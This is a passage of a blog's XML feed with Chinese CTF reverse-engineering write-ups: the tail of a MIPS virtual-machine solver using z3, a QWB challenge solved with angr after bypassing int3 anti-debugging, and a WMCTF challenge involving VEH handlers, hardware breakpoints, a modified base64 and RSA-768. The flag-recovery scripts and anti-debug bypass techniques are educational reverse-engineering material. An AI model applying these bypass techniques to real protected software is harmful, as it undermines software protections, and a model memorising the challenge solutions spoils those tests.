class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x79</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x7A</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x34</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x3E</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x02</span>, </span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x64</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x02</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x01</span>, <span class="number">0x7E</span>, <span class="number">0x00</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line"><span class="comment">#print len(code)</span></span><br><span class="line">lenth=len(code)/<span class="number">4</span></span><br><span class="line">sum=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> code:</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">0xff</span>:</span><br><span class="line">        sum+=<span class="number">1</span></span><br><span class="line"><span class="keyword">print</span> sum</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">n=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(sum):</span><br><span class="line">    s=Solver()</span><br><span class="line">    temp=[BitVec(<span class="string">&#x27;num&#x27;</span>,<span class="number">8</span>),<span class="number">0</span>]</span><br><span class="line">    num=temp[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        opcode=code[n]</span><br><span class="line">        opcode1=code[n+<span class="number">1</span>]</span><br><span class="line">        opcode2=code[n+<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> opcode==<span class="number">0x34</span> <span class="keyword">and</span> opcode2==<span class="number">0xff</span>:</span><br><span class="line">            s.add(temp[<span class="number">0</span>]&lt;<span class="number">0x7e</span>)</span><br><span class="line">            s.add(temp[<span class="number">0</span>]&gt;<span class="number">0x20</span>)</span><br><span class="line">            n+=<span class="number">4</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> opcode==<span class="number">0x34</span> <span class="keyword">and</span> opcode1!=<span class="number">0</span>:</span><br><span class="line">            temp[<span class="number">1</span>]=opcode2</span><br><span class="line">            n+=<span class="number">4</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> opcode==<span class="number">0x3b</span> <span class="keyword">and</span> opcode1!=<span class="number">0</span>:</span><br><span class="line">            temp[<span class="number">1</span>]+=opcode2</span><br><span class="line">            n+=<span class="number">4</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> opcode==<span class="number">0x3b</span> <span class="keyword">and</span> opcode1==<span class="number">0</span>:</span><br><span class="line">            temp[<span class="number">0</span>]+=temp[<span class="number">1</span>]</span><br><span class="line">            n+=<span class="number">4</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> opcode==<span class="number">0x6e</span>:</span><br><span class="line">            temp[<span class="number">0</span>]^=temp[<span class="number">1</span>]</span><br><span class="line">            n+=<span class="number">4</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> opcode==<span class="number">0x3d</span> <span class="keyword">and</span> opcode1!=<span class="number">0</span>:</span><br><span class="line">            temp[<span class="number">1</span>]-=opcode2</span><br><span class="line">            n+=<span class="number">4</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> opcode==<span class="number">0x3d</span> <span class="keyword">and</span> opcode1==<span class="number">0</span>:</span><br><span class="line">            temp[<span class="number">0</span>]-=temp[<span class="number">1</span>]</span><br><span class="line">            n+=<span class="number">4</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> opcode==<span class="number">0x3a</span>:</span><br><span class="line">            temp[<span class="number">0</span>]*=temp[<span class="number">1</span>]</span><br><span class="line">            n+=<span class="number">4</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> opcode==<span class="number">0x4f</span>:</span><br><span class="line">            s.add(temp[<span class="number">0</span>]==<span class="number">0</span>)</span><br><span class="line">            n+=<span class="number">4</span></span><br><span class="line">            <span class="keyword">print</span> s.check()</span><br><span class="line">            flag+=chr(s.model()[num].as_long())</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p>最后总结一下，这题考的主要是虚拟机和对mips架构汇编指令的理解，过程并不复杂，难的是无用函数太多了，mips架构调试起来比较费劲，总结起来就一句话没有很难的虚拟机，只有你想不到恶心。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这是个32位MIPS架构的虚拟机题，opcode总共有1660个量十分大，而且程序也有688K，调试起来也是十分需要考验耐心的，但虚拟机始终是虚拟机只要找到关键位置后其实分析起来还是比较简单的。所有的opcode都集中在0x4b2020处，根据程序运行出现的“&amp;gt;”的符</summary>
      
    
    
    
    <category term="mips-reverse" scheme="http://yoursite.com/categories/mips-reverse/"/>
    
    
    <category term="VM" scheme="http://yoursite.com/tags/VM/"/>
    
  </entry>
  
  <entry>
    <title>QWB-xx_warmup_obf</title>
    <link href="http://yoursite.com/2020/09/06/QWB-re1/"/>
    <id>http://yoursite.com/2020/09/06/QWB-re1/</id>
    <published>2020-09-06T11:06:04.060Z</published>
    <updated>2020-09-07T03:05:12.811Z</updated>
    
    <content type="html"><![CDATA[<p>首先恭喜BOI晋级强网杯决赛，多谢队伍里的大佬们在百忙之中抽出时间来打比赛，带小弟能够去线下见见世面。此次强网杯比赛逆向方向感觉题目难度分配的还是比较均匀的，强网先锋里的题目可以先找找自信，后面在逆向方向陆续出的题目也是由易到难不至于打的自闭。后面陆续会针对强网杯的每道题目做出详细分析，此篇先分析xx_warmup_obf。</p><p>动态调试该题可以看到会不断的出现int 3指令，推测应该里面应该加入反调试技术。</p><p><img src="/2020/09/06/QWB-re1/image-20200831201619445.png" alt="image-20200831201619445"></p><p>继续跟下去发现就是一个死循环，eax不论怎样都不会等于0x24c1d7a3，因此调试的话是肯定执行不到输入判断处。大致看了下程序在init_array存在一个sub_400B4C信号量处理函数</p><p><img src="/2020/09/06/QWB-re1/image-20200831204311020.png" alt="image-20200831204311020"></p><p>里面存在大量的赋值语句，估计该程序的反调试技术由于int 3指令执行导致不能触发信号量处理，解决的方法就是在判断语句处set寄存器的值为判断值就行（虽然很麻烦），根据信号量处理赋值语句的数量估计要改很多处判断，小编采取的是attach的方式改了不到5处判断就顺利进入到输入验证语句处。</p><p><img src="/2020/09/06/QWB-re1/image-20200831205307126.png" alt="image-20200831205307126"></p><p>首先会验证你的输入长度是否为0x1C，然后就是解28组方程，方程的变量数目依次增加，但每组方程只会解出一个变量，我在做这个题目时也想过去花指令直接f5然后z3解，但后来发现不现实，花指令完全没规律而且量多，最后小编是一步一步手扣下来，扣了几个小时才扣完。但后来想了想其实可以采取爆破的方式一次爆四个变量，且不需要把28个方程全部扣下来。但这也是个蠢办法。赛后看了大佬的wp其实可以用angr指定路径分析。你的输入都放置在rax指向的内存空间处，所以可以对rax设置一个内存地址，利用claripy对该地址初始化向量。这里稍微修改了下大佬的exp，并做了些注释。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line">p=angr.Project(<span class="string">&#x27;./xx_warmup_obf&#x27;</span>,auto_load_libs=<span class="literal">False</span>)</span><br><span class="line">state=p.factory.blank_state(addr=<span class="number">0x402d10</span>)<span class="comment">#指定入口</span></span><br><span class="line">tmp_addr=<span class="number">0x20000</span><span class="comment">#模拟一个内存地址用于存放输入</span></span><br><span class="line">ans=claripy.BVS(<span class="string">&#x27;ans&#x27;</span>,<span class="number">8</span>*<span class="number">28</span>)</span><br><span class="line">state.memory.store(tmp_addr,ans)<span class="comment">#往地址空间部署符号大小为8位长度为28的符号变量</span></span><br><span class="line">state.regs.rax=<span class="number">0x20000</span><span class="comment">#设置rax指向地址0x20000</span></span><br><span class="line">sm=p.factory.simgr(state)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> byt <span class="keyword">in</span> ans.chop(<span class="number">8</span>):<span class="comment">#把整个数据分割每８位为一组，并对每个数据大小作出限制</span></span><br><span class="line">    state.add_constraints(state.solver.And(byt&gt;=ord(<span class="string">&#x27; &#x27;</span>),byt&lt;=ord(<span class="string">&#x27;~&#x27;</span>)))</span><br><span class="line">find=[<span class="number">0x408470</span>]<span class="comment">#最后一个方程的判断跳转地址</span></span><br><span class="line">avoid=[<span class="number">0x402d2f</span>,<span class="number">0x402f96</span>,<span class="number">0x4032c5</span>,<span class="number">0x4034b6</span>,<span class="number">0x4035cf</span>,<span class="number">0x403728</span>,<span class="number">0x4039d4</span>,<span class="number">0x403b27</span>,<span class="number">0x403cb9</span>,<span class="number">0x403e34</span>,<span class="number">0x40418f</span>,<span class="number">0x40459c</span>,<span class="number">0x4048fe</span>,<span class="number">0x404c6d</span>,<span class="number">0x405051</span>,<span class="number">0x405286</span>,<span class="number">0x405594</span>,<span class="number">0x4057ef</span>,<span class="number">0x405b96</span>,<span class="number">0x406057</span>,<span class="number">0x406537</span>,<span class="number">0x406931</span>,<span class="number">0x406da9</span>,<span class="number">0x407069</span>,<span class="number">0x407606</span>,<span class="number">0x40790b</span>,<span class="number">0x407d8f</span>,<span class="number">0x4081b4</span>]<span class="comment">#方程最后判断语句的下一个语句的地址</span></span><br><span class="line"><span class="keyword">print</span> (len(avoid))</span><br><span class="line"></span><br><span class="line">sm.explore(find=find,avoid=avoid)</span><br><span class="line"><span class="keyword">if</span> sm.found:</span><br><span class="line">    solution_state=sm.found[<span class="number">0</span>]</span><br><span class="line">    solution=solution_state.se.eval(ans,cast_to=bytes)</span><br><span class="line">    <span class="keyword">print</span> (solution)</span><br></pre></td></tr></table></figure><p>输出结果</p><p><img src="/2020/09/06/QWB-re1/image-20200831214958257.png" alt="image-20200831214958257"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;首先恭喜BOI晋级强网杯决赛，多谢队伍里的大佬们在百忙之中抽出时间来打比赛，带小弟能够去线下见见世面。此次强网杯比赛逆向方向感觉题目难度分配的还是比较均匀的，强网先锋里的题目可以先找找自信，后面在逆向方向陆续出的题目也是由易到难不至于打的自闭。后面陆续会针对强网杯的每道题目</summary>
      
    
    
    
    <category term="linux-reverse" scheme="http://yoursite.com/categories/linux-reverse/"/>
    
    
    <category term="anti-debug" scheme="http://yoursite.com/tags/anti-debug/"/>
    
    <category term="angr" scheme="http://yoursite.com/tags/angr/"/>
    
  </entry>
  
  <entry>
    <title>WMCTF:welcome-to-ctf</title>
    <link href="http://yoursite.com/2020/08/29/welcome-to-ctf/"/>
    <id>http://yoursite.com/2020/08/29/welcome-to-ctf/</id>
    <published>2020-08-29T11:35:18.887Z</published>
    <updated>2020-08-15T13:08:18.963Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><p>这道题先不说算法，技术层面上就很有意思，反调试函数，硬件断点设置，以及VEH,UEF设置和注册都是借助GetProcAddress函数完成的，导致从import表无法查找到相关函数信息，有关VEH和UEF的相关知识可以看下大佬的这篇文章<a href="https://bbs.pediy.com/thread-226235.htm%E3%80%82">https://bbs.pediy.com/thread-226235.htm。</a></p><p>程序的反调试函数是NTInformationProcess，如果装了sharpOD后可以不用对其进行patch，可以直接到main函数，但main函数其实是一个假的验证函数，就是一个base64解密，但如何进入到正确的验证流程，还是得分析VEH和UEF在程序中的应用。先是对GetProcAddress函数下断。</p><p><img src="/2020/08/29/welcome-to-ctf/1.PNG" alt="1"></p><p>这个RtlAddVectoredExceptionHandler函数其实就是添加VEH异常处理函数</p><p><img src="/2020/08/29/welcome-to-ctf/1597483055033.png" alt="1597483055033"></p><p>这个SetUnhandledExceptionFilter是异常捕获主要用于对反调试检测触发，导致程序崩溃</p><p><img src="/2020/08/29/welcome-to-ctf/1597483731423.png" alt="1597483731423"></p><p><img src="/2020/08/29/welcome-to-ctf/1597483759671.png" alt="1597483759671"></p><p>这个getthreadcontext和setthreadcontext函数是配套使用的主要和硬件断点设置有关，在官方wp中也说了程序设置了4个硬件断点，刚好这一对函数也调用了四次。具体的硬件断点查看主要0x40121c处，这个可以从对SetUnhandledExceptionFilter的调用中得到信息。这个反调试函数也是真的隐藏的够深，真的感觉出题人用尽心思。</p><p><img src="/2020/08/29/welcome-to-ctf/1597484393338.png" alt="1597484393338"></p><p><img src="/2020/08/29/welcome-to-ctf/1597484117807.png" alt="1597484117807"></p><p><img src="/2020/08/29/welcome-to-ctf/1597492796065.png" alt="1597492796065"></p><p>可以看到里面正好有四个if语句刚好是四个硬件断点处分别对四个硬件断点做了VEH注册，当程序执行到硬件断点处会触发异常处理函数。对if处下断。</p><p><img src="/2020/08/29/welcome-to-ctf/1597493597566.png" alt="1597493597566"></p><p>可以看到0x4027C8是main函数中那个假的验证函数，当判断通过后修改了eip为0x402883，因此在0x402883才是真正的验证函数：</p><p><img src="/2020/08/29/welcome-to-ctf/1597494257162.png" alt="1597494257162"></p><p>整个一套流程就是魔改base64.decode()-&gt;RSA-768-&gt;x^3+z^3+80435758145817515^3=42。但是0x402316里面的表还不是真正魔改后的表。在第VEH注册函数中第三个判断又会对表进行修改，我是是真的吐了。后续调试的话就不能对main函数下断点了，因为有sharpOD的存在导致异常处理不能在调试过程中执行，只能对正确的判断函数下断。RSA-768的特征是从内存中看到它的n值判断来的，上网查它的p和q都有，三元三次方程则是根据看到了80435758145817515推测出来，但具体判断等于42在哪还是希望哪位师傅看到了能够指点一下。最后就是解密脚本了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> *</span><br><span class="line">stable=<span class="string">&quot;FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 09 FF FF FF 36 3F 08 2E 0C 04 1B 0A 00 27 2F FF FF FF FF FF FF FF 1D 35 29 0B 11 3B 05 31 15 07 10 23 28 02 26 18 37 1E 3C 1A 32 22 06 1F 2D 34 FF FF FF FF FF FF 19 17 30 3A 13 2C 0F 3E 33 38 0D 1C 01 12 14 16 3D 0E 20 2B 39 25 03 2A 21 24 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF&quot;</span></span><br><span class="line">stable=stable.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">b64stable=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(stable),<span class="number">3</span>):</span><br><span class="line">    tmp=<span class="string">&quot;&quot;</span></span><br><span class="line">    tmp+=stable[i]</span><br><span class="line">    tmp+=stable[i+<span class="number">1</span>]</span><br><span class="line">    b64stable.append(int(tmp,<span class="number">16</span>))</span><br><span class="line">    <span class="comment">#print tmp</span></span><br><span class="line">table=[<span class="string">&#x27;&#x27;</span>]*<span class="number">64</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(b64stable)):</span><br><span class="line">    <span class="keyword">if</span> b64stable[i]!=<span class="number">255</span>:</span><br><span class="line">        table[b64stable[i]]=i</span><br><span class="line"><span class="comment">#print len(table)</span></span><br><span class="line">string1=<span class="string">&quot;&quot;</span>.join(map(chr,table))</span><br><span class="line"><span class="keyword">print</span> string1</span><br><span class="line">string2=<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">n=<span class="number">1230186684530117755130494958384962720772853569595334792197322452151726400507263657518745202199786469389956474942774063845925192557326303453731548268507917026122142913461670429214311602221240479274737794080665351419597459856902143413</span></span><br><span class="line">p = <span class="number">33478071698956898786044169848212690817704794983713768568912431388982883793878002287614711652531743087737814467999489</span></span><br><span class="line">q = <span class="number">36746043666799590428244633799627952632279158164343087642676032283815739666511279233373417143396810270092798736308917</span></span><br><span class="line">d=<span class="number">0x10001</span></span><br><span class="line">m=<span class="number">5803427745647280975433812866345295</span> </span><br><span class="line"><span class="comment">#x^3+y^3+z^3=42 z确定z=80435758145817515，此处的m为xy拼接后的值</span></span><br><span class="line">phiN = (p - <span class="number">1</span>) * (q - <span class="number">1</span>) </span><br><span class="line">e = gmpy2.invert(d, phiN)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;e =&#x27;</span>, hex(e)</span><br><span class="line">enc = pow(m, e, n)</span><br><span class="line"><span class="keyword">print</span> enc</span><br><span class="line">b64 = hex(enc)[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">print</span> len(b64)</span><br><span class="line">tmp=<span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(b64),<span class="number">2</span>):</span><br><span class="line">    tmp+=chr(int(b64[i:i+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line">flag = <span class="string">&#x27;WMCTF&#123;&#x27;</span> + tmp.encode(<span class="string">&quot;base64&quot;</span>).translate(string.maketrans(string2,string1)).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&#x27;&#125;&#x27;</span> </span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>]]></content>
